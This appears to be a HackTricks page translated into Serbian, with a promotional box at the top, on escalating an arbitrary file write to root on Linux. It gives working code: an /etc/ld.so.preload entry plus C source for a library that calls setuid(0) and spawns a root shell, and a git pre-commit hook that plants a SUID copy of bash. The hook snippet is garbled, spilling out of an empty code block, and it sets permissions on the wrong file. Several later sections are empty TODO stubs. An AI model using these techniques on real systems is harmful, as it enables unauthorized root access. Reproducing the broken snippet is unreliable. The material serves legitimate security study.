# Arbitrary File Write to Root

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### /etc/ld.so.preload

Ova datoteka se ponaša kao **`LD_PRELOAD`** env promenljiva ali takođe funkcioniše i u **SUID binarnim fajlovima**.\
Ako možete da je kreirate ili modifikujete, možete jednostavno dodati **putanju do biblioteke koja će biti učitana** sa svakim izvršenim binarnim fajlom.

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git kuke

[**Git kuke**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) su **skripte** koje se **pokreću** pri različitim **događajima** u git repozitorijumu, kao što je kreiranje commit-a, spajanje... Dakle, ako **privilegovani skript ili korisnik** često obavljaju ove radnje i mogu **pisati u `.git` folder**, to se može iskoristiti za **privesc**.

Na primer, moguće je **generisati skriptu** u git repozitorijumu u **`.git/hooks`** tako da se uvek izvršava kada je kreiran novi commit:

{% code overflow="wrap" %}
```
```
{% endcode %}

\`\`\`bash echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit chmod +x pre-commit \`\`\` ### Cron & Time fajlovi

TODO

### Servis & Socket fajlovi

TODO

### binfmt\_misc

Fajl koji se nalazi u `/proc/sys/fs/binfmt_misc` pokazuje koji binarni fajl treba da izvrši koji tip fajla. TODO: proveriti uslove za zloupotrebu ovoga kako bi se izvršio reverzni shell kada je otvoren zajednički tip fajla.
